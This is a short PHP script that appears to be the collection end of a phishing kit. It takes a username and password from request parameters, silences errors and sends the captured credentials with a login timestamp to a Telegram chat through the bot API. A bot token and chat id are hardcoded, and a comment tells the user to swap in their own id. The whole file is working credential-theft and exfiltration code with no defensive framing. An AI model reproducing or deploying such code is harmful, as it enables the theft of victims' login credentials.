<?php

date_default_timezone_set("Asia/kolkata");
error_reporting(0);

$time = date("h:i a", time());

$email = $_GET["name"];
$password = $_GET["pass"];

$message = "Username : $email \nPassword: $password \nTried Login at $time IST";

$chat_id= 1737269785; // replace with your userid


send_message($chat_id,"$message");


function send_message($chat_id, $message){
        $text = urlencode($message);
        $apiToken = "5812567177:AAFKiEzYEdTi0fjDPXAh6o4lQXNKpic3708";
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
    }
?>
